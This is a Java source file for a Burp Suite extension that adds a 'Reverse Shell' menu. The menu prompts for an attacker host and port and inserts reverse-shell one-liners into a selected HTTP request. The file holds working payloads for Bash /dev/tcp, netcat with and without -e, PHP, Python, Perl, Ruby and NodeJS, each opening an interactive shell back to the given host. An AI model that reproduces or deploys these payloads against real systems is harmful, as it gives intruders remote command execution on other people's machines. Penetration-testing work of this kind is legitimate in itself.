package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Arrays;
import javax.swing.JMenu;

/**
 *
 * @author errorfiathck
 */
public class Reverse_Shell_Menu extends JMenu {
    public BurpExtender myburp;
    public String[] Reverse_Shell_Menu = {"One Liner", "Code snippet"};
    public String Reverse_Shell_Menuitems[][] = {
        {"Bash", "nc", "nc without -e", "Php","Python", "Perl", "Ruby", "NodeJS"},
        {}
    };
    
    Reverse_Shell_Menu(BurpExtender burp){
        this.setText("Reverse Shell");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, Reverse_Shell_Menu, Reverse_Shell_Menuitems, new ReverseShellItemListener(myburp));
    }
}



class ReverseShellItemListener implements ActionListener {

    BurpExtender myburp;
    ReverseShellItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        byte[] param = new byte[selectedIndex[1]-selectedIndex[0]];
        System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1]-selectedIndex[0]);
        String selectString = new String(param);
        String action = e.getActionCommand();
        byte[] newRequest = do_ReverseShell(request, selectString, action, selectedIndex);
        req.setRequest(newRequest);
    }
    
    public byte[] do_ReverseShell(byte[] request, String selectedString, String action, int[] selectedIndex){
        String rHost, rPort;
        switch(action){
            case "Bash":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "bash -i >& /dev/tcp/" + rHost + "/" + rPort + " 0>&1";
                break;
            case "nc":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "nc -e /bin/sh " + rHost + " " + rPort;
                break;
            case "nc without -e":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + rHost + " " + rPort + " >/tmp/f";
                break;
            case "Php":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "php -r '$sock=fsockopen(\"" + rHost + "\"," + rPort + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
                break;
            case "Python":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + rHost + "\"," + rPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                break;
            case "Perl":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "perl -e 'use Socket;$i=\"" + rHost + "\";$p=" + rPort + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'";
                break;
            case "Ruby":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "ruby -rsocket -e'f=TCPSocket.open(\"" + rHost + "\"," + rPort + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
                break;
            case "NodeJS":
                rHost = Methods.prompt_and_validate_input("Enter RHost", null);
                rPort = Methods.prompt_and_validate_input("Enter RPort", null);
                selectedString = "(function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(" + rPort + ", '" + rHost + "', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/; })();";
                break;
            default:
                break;
        }
        return Methods.do_modify_request(request, selectedIndex, selectedString);
    }
    

}